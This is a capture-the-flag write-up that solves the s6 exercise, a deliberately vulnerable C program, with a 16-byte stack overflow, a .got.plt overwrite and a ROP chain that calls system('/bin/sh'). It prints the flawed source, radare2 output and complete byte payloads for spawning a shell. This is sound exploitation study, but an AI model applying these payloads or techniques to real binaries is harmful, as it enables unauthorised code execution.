# Solving wapiflapi's s6 with radare2

## Intro

This solution builds upon the same method applied [to solve s5](https://github.com/mrmacete/writeups/tree/master/wapiflapi-exrs/sploit/s5).

This time the code is similar, but slightly different:

```c
int main(int argc, char **argv)
{
  char buffer[32];

  (void) argc, (void) argv;

  printf("Welcome Stranger\n");
  printf("What is your password?\n");

  if (read(0, buffer, 48) <= 0)
    err(EXIT_FAILURE, "read");

  printf("If you're cool you'll get a shell.\n");

  if (strcmp("pretend_you_dont_know_this", buffer) == 0)
    system("whoami # not sh :)");

  return 0;
}
```

The big difference is that the vulnerable `read` call overflows the buffer by only 16 bytes.

### Goal

To spawn a shell

### Challanges

1. built-in `system` call's argument is not a shell
2. only one read call in a single buffer
3. must be solved using only stdin
4. no assumptions on libc version or address layout are allowed
5. **only 16 bytes of overlow**!

### Solution plan

1. with the first read on the buffer, smash the stack and gain control of `rip`
2. do a second read, writing the `/bin/sh` string at a known address
3. execute `system` using the above command as argument
4. use the same **.got.plt / stack resonance** method used in [s5 solution](https://github.com/mrmacete/writeups/tree/master/wapiflapi-exrs/sploit/s5)

Surely there are simpler solutions, but i'm too stupid / lazy to find them.

## A close look to .got.plt
As an introduction, it is useful to recap the structure of the .got.plt section, which is interesting because:

1. it's writable
2. contains pointers to imported functions (more precisely to their wrappers) 
3. dynamically linked code blindly jumps to them upon each call to an imported function

Here is what radare2 has to tell about it:

```r2
$ r2 s6
 -- Heisenbug: A bug that disappears or alters its behavior when one attempts to probe or isolate it.
[0x00400560]> aa
[0x00400560]> iS~.got.plt
idx=22 vaddr=0x00601000 paddr=0x00001000 sz=80 vsz=80 perm=-rw- name=.got.plt

[0x00400560]> pxw 80@0x00601000
0x00601000  0x00600e28 0x00000000 0x00000000 0x00000000  (.`.............
0x00601010  0x00000000 0x00000000 0x004004f6 0x00000000  ..........@.....
0x00601020  0x00400506 0x00000000 0x00400516 0x00000000  ..@.......@.....
0x00601030  0x00400526 0x00000000 0x00400536 0x00000000  &.@.....6.@.....
0x00601040  0x00400546 0x00000000 0x00400556 0x00000000  F.@.....V.@.....

[0x00400560]> ii
[Imports]
ordinal=001 plt=0x004004f0 bind=GLOBAL type=FUNC name=puts
ordinal=002 plt=0x00400500 bind=GLOBAL type=FUNC name=system
ordinal=003 plt=0x00400510 bind=GLOBAL type=FUNC name=read
ordinal=004 plt=0x00400520 bind=GLOBAL type=FUNC name=__libc_start_main
ordinal=005 plt=0x00400530 bind=GLOBAL type=FUNC name=strcmp
ordinal=006 plt=0x00400540 bind=UNKNOWN type=NOTYPE name=__gmon_start__
ordinal=007 plt=0x00400550 bind=GLOBAL type=FUNC name=err

7 imports 
```

Mixing above information into an high level tabular representation (all addresses and values are 64 bits wide, truncated for brevity):

Address           |Value          | Meaning
------------------|---------------|-----------------
0x00601000        | 0x00600e28    | .dynamic
0x00601008        | 0             | placeholder for dynamic entry
0x00601010        | 0             | placeholder for dynamic entry
0x00601018        | 0x004004f6    | puts
0x00601020        | 0x00400506    | system
0x00601028        | 0x00400516    | read
0x00601030        | 0x00400526    | \_\_libc\_start\_main
0x00601040        | 0x00400536    | strcmp
0x00601048        | 0x00400546    | \_\_gmon\_start\_\_
0x00601050        | 0x00400556    | err

The first three rows are changed at runtime and cannot be easily overwritten, while the remaining part are mere pointers to which each call to `sym.imp.something` will blindly jump.

To be precise, the dynamic part is changed only before execution of **real** imported calls and not by overwritten ones, so in the particular case in which all the plt entries will go overwritten, it's ok to use the dynamic entry's space also - only i'm unsure if such a case exists.

For the purpose of this writeup, though, let's consider only the mere jump pointers as writable, mainly because it's useful to keep the `system` import up and running until the end.

As in the s5 writeup, we'll use the PLT to store both the "/bin/sh" command string to be used as a parameter for `system`, and to hijack the execution in order to **use all bytes of the buffer on the stack** for ROPping and not only the last 16.


## Step 1 - smashing the stack

As usual, the stack smashing will happen thanks to the vulnerable `read` call, which let us overwrite the saved `rbp` value (frame pointer) and the return address of `main`.

After reading all the 48 bytes, the stack will look like this:

Chunk Contents   | Chunk length   | Meaning 
-----------------| ---------------|----------------
????             | 32 bytes       | Initial data, regularly inside the buffer
XXXXXXXX          | 8 bytes        | Overwrites saved frame pointer
YYYYYYYY       | 8 bytes        | This overwrites the return address of `main`

Since the epilogue of `main` is, as usual:

```r2
[0x00400560]> e asm.vars=false
[0x00400560]> e asm.varsub=false
[0x00400560]> aa
[0x00400560]> s main
[0x0040064d]> V
[...]
```

```asm
│          0x004006d1    c9             leave
╘          0x004006d2    c3             ret
```
It means that:

1. `rbp` will become `XXXXXXXX`, i.e. the overwritten frame pointer
2. after `ret`, the code at address `YYYYYYYY` is executed

Basically there's only one bullet, the goal is to not waste it! Let's look at the `read` gadget in `main`:

```asm
│          0x00400670   lea rax, [rbp - 0x20]
│          0x00400674   mov edx, 0x30
│          0x00400679   mov rsi, rax
│          0x0040067c   mov edi, 0
│          0x00400681   mov eax, 0
│          0x00400686   call sym.imp.read
```
So, since we can control `rbp` via `XXXXXXXX` value, it is possible to read again, at a chosen address, by setting `YYYYYYYY` to `0x00400670`.

As anticipated, the idea is that the second `read` call will overwrite 48 bytes of the .got.plt section, so `XXXXXXXX` will be an address in the range of the PLT table.

## Step 2 - hijacking the PLT

The goals to achieve by writing on the .got.plt section this time are multiple:

1. store the "/bin/sh" command string
2. rewind the stack a bit, in order to use some more of the buffer already on the stack to build a ROP chain
3. regain control of the stack and its return chain


In order to rewind the stack, the obvius code to execute is the `sub rsp, 0x30` at beginning of `main`:

```asm
[0x00400634]> pd 7@main
╒ (fcn) sym.main 134
│          ; DATA XREF from 0x0040057d (entry0)
│          ;-- main:
│          ;-- sym.main:
│          0x0040064d   push rbp
│          0x0040064e   mov rbp, rsp
│          0x00400651   sub rsp, 0x30
│          0x00400655   mov dword [rbp - 0x24], edi
│          0x00400658   mov qword [rbp - 0x30], rsi
│          0x0040065c   mov edi, str.Welcome_Stranger                  ; "Welcome Stranger" @ 0x400768
│          0x00400661   call sym.imp.puts
│             sym.imp.puts()
```
This means that by replacing a .got.plt entry to point to `0x00400651`, it is possible to execute the stack rewind. Here are the obstacles:

* after the stack rewind, all the `main` function will be executed again
* currently our `rbp` still points to the address into .got.plt section

Here are the solutions:

* overwrite all the non-`system` imports in order to avoid stack writing that can destroy our ROP chain which is already on the stack
* use the last of the functions to regain control of the stack and start the ROP chain
* instead of executing directly the `sub rsp, 0x30`, jump to the previous instruction: `mov rbp, rsp` this will avoid overwriting the dynamic parts of the PLT, at the cost of loosing the first 16 bytes of the available stack buffer, but it's ok in this case

All the needed ROP gadgets are:

```asm
[0x00400706]> e rop.len=4
[0x00400706]> /R pop

  [...]
  
  0x0040073e           415d  pop r13
  0x00400740           415e  pop r14
  0x00400742           415f  pop r15
  0x00400744             c3  ret

  0x00400743             5f  pop rdi
  0x00400744             c3  ret

```
Finally, by choosing the starting point to be the address `0x00601018`, the `XXXXXXXX` value will be `0x00601038` (because before the `read` the `rbp` value is subtracted by `0x20`).

At the end of the game, the .got.plt table will be changed like this (in bold the overwritten bytes):

Address           |Value          | Meaning
------------------|---------------|-----------------
0x00601000        | 0x00600e28    | .dynamic
0x00601008        | 0             | placeholder for dynamic entry
0x00601010        | 0             | placeholder for dynamic entry
0x00601018        | **0x00400744**    | ~~puts~~ `ret`
0x00601020        | **0x00400506**    | system
0x00601028        | **0x0040073e**    | ~~read~~ `pop;pop;pop;ret;`
0x00601030        | **0x00400526**    | \_\_libc\_start\_main
0x00601038        | **0x0040064e**    | ~~strcmp~~ the address of the instruction before `sub rsp, 0x30`
0x00601040        | **0x0068732F6E69622F**    | ~~\_\_gmon\_start\_\_~~ "/bin/sh"
0x00601048        | 0x00400556    | err

In this way, the `puts` are harmless, and the `read` will align the stack (by removing the crap pushed by previous calls, and the first padding of the buffer which went overwritten just after the stack rewind) and return to the first gadget of the ROP chain.

So, finally, the bash-friendly and 64-bit aligned little endian buffer for the *second* read will be:

```
\x44\x07\x40\x00\x00\x00\x00\x00\x06\x05\x40\x00\x00\x00\x00\x00\x3e\x07\x40\x00\x00\x00\x00\x00\x26\x05\x40\x00\x00\x00\x00\x00\x4e\x06\x40\x00\x00\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00
```

## Step 3 - the final ROP chain

The final buffer, to be stored on the stack with the first call to `read` is, therefore:

Chunk Contents   | Chunk length   | Meaning 
-----------------| ---------------|----------------
0x42..0x42       | 8 bytes        | padding
0x00400743       | 8 bytes        | `pop rdi; ret`
0x00601040       | 8 bytes        | address of "/bin/sh"
0x004006c7       | 8 bytes        | `call sym.imp.system`
0x00601038         | 8 bytes        | Overwrites saved frame pointer (start of PLT target + 0x20)
0x00400670       | 8 bytes        | This overwrites the return address of `main` (let's `read` again, to overwrite PLT)

In bash-friendly and 64-bit aligned little endian format, the buffer for the *first* read:

```
\x42\x42\x42\x42\x42\x42\x42\x42\x43\x07\x40\x00\x00\x00\x00\x00\x40\x10\x60\x00\x00\x00\x00\x00\xc7\x06\x40\x00\x00\x00\x00\x00\x38\x10\x60\x00\x00\x00\x00\x00\x70\x06\x40\x00\x00\x00\x00\x00
```

## Running and cinema

Here is the command line used to send escaped bytes to stdin:

```bash
 while read -r line; do echo -e $line; done | ./s6
```

This time, to avoid unwanted `\n`'s in the buffer, it is necessary to merge the two buffers in one and send only once:

```
\x42\x42\x42\x42\x42\x42\x42\x42\x43\x07\x40\x00\x00\x00\x00\x00\x40\x10\x60\x00\x00\x00\x00\x00\xc7\x06\x40\x00\x00\x00\x00\x00\x38\x10\x60\x00\x00\x00\x00\x00\x70\x06\x40\x00\x00\x00\x00\x00\x44\x07\x40\x00\x00\x00\x00\x00\x06\x05\x40\x00\x00\x00\x00\x00\x3e\x07\x40\x00\x00\x00\x00\x00\x26\x05\x40\x00\x00\x00\x00\x00\x4e\x06\x40\x00\x00\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00
```

[![asciicast](https://asciinema.org/a/dlqa349vkqiufvb7qnu429iwu.png)](https://asciinema.org/a/dlqa349vkqiufvb7qnu429iwu)
